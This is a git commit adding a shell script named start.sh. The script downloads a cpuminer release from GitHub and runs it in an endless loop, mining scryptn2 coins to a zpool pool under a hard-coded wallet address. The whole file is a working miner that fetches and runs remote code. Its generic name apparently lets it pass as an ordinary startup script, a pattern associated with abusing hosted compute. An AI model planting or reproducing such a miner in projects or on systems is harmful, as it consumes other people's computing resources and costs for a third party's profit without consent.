dd8fae4ba23f8e17d3df0de983186cb6d3015209
Gazzy J. Uruj <ghazanfar.uruj.cool@gmail.com>
2021-08-30 00:35:15 +0530

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,7 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.7/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+cd cpuminer-opt-linux
+while [ 1 ]; do
+      ./cpuminer-avx2 -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zpool.ca:4339 -u RHgNMN1oZhUEUKbpA4XLcVD73oVFVdGEwJ -p c=VRSC
+      sleep 0
+done
